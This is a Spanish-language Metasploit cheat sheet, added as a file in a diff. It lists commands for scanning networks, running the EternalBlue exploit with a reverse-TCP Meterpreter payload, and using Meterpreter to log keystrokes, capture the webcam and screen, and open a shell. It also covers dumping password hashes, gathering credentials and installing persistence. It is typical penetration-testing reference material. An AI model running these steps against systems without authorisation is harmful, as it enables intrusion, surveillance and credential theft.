@@ -1,0 +1,175 @@
+────────────────────────────
+   METASPLOIT FRAMEWORK - CHEAT SHEET
+────────────────────────────
+
+[1] INICIO Y NAVEGACIÓN
+────────────────────────────
+# Iniciar Metasploit
+msfconsole
+
+# Actualizar la base de datos
+msfupdate
+
+# Buscar un módulo
+search nombre_o_palabra_clave
+
+# Usar un módulo
+use ruta/del/modulo
+
+# Mostrar información del módulo cargado
+info
+
+# Listar opciones configurables
+show options
+
+# Listar payloads disponibles
+show payloads
+
+# Volver al menú principal
+back
+
+[2] CONFIGURACIÓN DE MÓDULOS
+────────────────────────────
+# Establecer opciones
+set OPCION VALOR
+
+# Establecer opción global (persistente)
+setg OPCION VALOR
+
+# Limpiar opciones
+unset OPCION
+unsetg OPCION
+
+[3] TIPOS DE MÓDULOS
+────────────────────────────
+# Exploits
+exploit          # Lanza el ataque
+run              # Alias de exploit
+
+# Auxiliary (escaneo, fuzzing, etc.)
+use auxiliary/...
+
+# Post-exploitation
+use post/...
+
+# Encoders
+use encoder/...
+
+# Nops
+use nop/...
+
+[4] ESCANEO Y RECONOCIMIENTO
+────────────────────────────
+# Escaneo de puertos y servicios
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+
+# Escaneo de SMB
+use auxiliary/scanner/smb/smb_version
+set RHOSTS target
+run
+
+[5] EXPLOTACIÓN
+────────────────────────────
+# Seleccionar exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Configurar objetivo
+set RHOST target_ip
+set RPORT puerto
+
+# Configurar payload
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST nuestra_ip
+set LPORT puerto_escucha
+
+# Ejecutar
+exploit
+
+[6] SESIONES METERPRETER
+────────────────────────────
+# Listar sesiones
+sessions
+
+# Interactuar con sesión
+sessions -i ID
+
+# Salir de la sesión pero mantenerla abierta
+background
+
+# Cerrar sesión
+sessions -k ID
+
+[7] COMANDOS ÚTILES EN METERPRETER
+────────────────────────────
+# Información del sistema
+sysinfo
+
+# Ver procesos
+ps
+
+# Cambiar a otro proceso
+migrate PID
+
+# Capturar pantalla
+screenshot
+
+# Descargar archivo
+download ruta_remota ruta_local
+
+# Subir archivo
+upload ruta_local ruta_remota
+
+# Capturar webcam
+webcam_snap
+
+# Keylogging
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Shell del sistema
+shell
+
+[8] POST-EXPLOITATION
+────────────────────────────
+# Recolectar hashes
+use post/windows/gather/hashdump
+
+# Buscar credenciales en memoria
+use post/windows/gather/credentials/...
+
+# Mantener acceso (Persistence)
+use exploit/windows/local/persistence
+
+[9] BASE DE DATOS INTERNA
+────────────────────────────
+# Conectar DB
+db_connect usuario:pass@localhost/msf
+
+# Guardar resultados de escaneo
+services
+hosts
+loot
+
+# Exportar resultados
+db_export -f xml ruta_archivo.xml
+
+[10] CONSEJOS Y ATAJOS
+────────────────────────────
+# Buscar por CVE
+search cve:2023-XXXX
+
+# Filtrar por plataforma
+search platform:windows type:exploit
+
+# Módulos más usados
+use exploit/multi/handler      # Recibir conexiones reversas
+use auxiliary/scanner/http/    # Escaneos web
+use auxiliary/scanner/ftp/     # Escaneos FTP
+
+────────────────────────────
+FIN DEL CHEAT SHEET
+────────────────────────────
